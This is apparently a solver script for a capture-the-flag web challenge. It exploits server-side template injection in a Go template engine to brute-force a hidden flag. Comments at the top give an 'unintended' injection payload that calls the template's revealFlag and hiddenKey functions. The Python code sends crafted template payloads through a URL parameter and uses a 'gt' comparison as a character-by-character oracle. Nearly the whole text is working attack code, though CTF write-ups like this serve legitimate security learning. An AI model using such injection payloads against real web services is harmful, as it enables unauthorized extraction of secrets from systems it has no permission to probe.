# uninteded solution by triggering an error 
# {{ $wiw := (call $.revealFlag (call $.hiddenKey)) }}
# {{range $k:=$wiw}}
# {{$k}}
# {{end}}

# my intended solution is using the only allowed function "gt"


import requests
import string

URL = "https://alwan.ctf.ingeniums.club"  

CHARSET = "".join(sorted(string.ascii_letters + string.digits + "_}"))
print(f"Charset: {CHARSET}")
# exit()
FLAG_PREFIX = "ingehack{"  

# exit()
def found(known_flag, test_char):
    testing = known_flag + test_char
    print(f"{testing}")
    payload = f'{{{{ gt (call .revealFlag (call .hiddenKey)) "{testing}" }}}}'
    response = requests.get(URL, params={"message": payload})
    gt = "true" in response.text
    return  not gt  # wen false, the previous char was correct

def brute_force_flag():
    flag = FLAG_PREFIX

    while True:
        previous_char = None
        found_match = False
        
        for char in CHARSET:
            if not found(flag, char):
                previous_char = char
            else:
                if previous_char is None:
                    raise ValueError("No valid character found, possible charset issue.")
                flag += previous_char
                print(f"Current flag: {flag}")
                found_match = True
                break
        
        if not found_match and previous_char == "}":
            flag += "}"
            print(f"Final flag: {flag}")
            return flag
            
        if not found_match:
            raise ValueError("No matching character found in charset")

if __name__ == "__main__":
    final_flag = brute_force_flag()
    print(f"Recovered flag: {final_flag}")
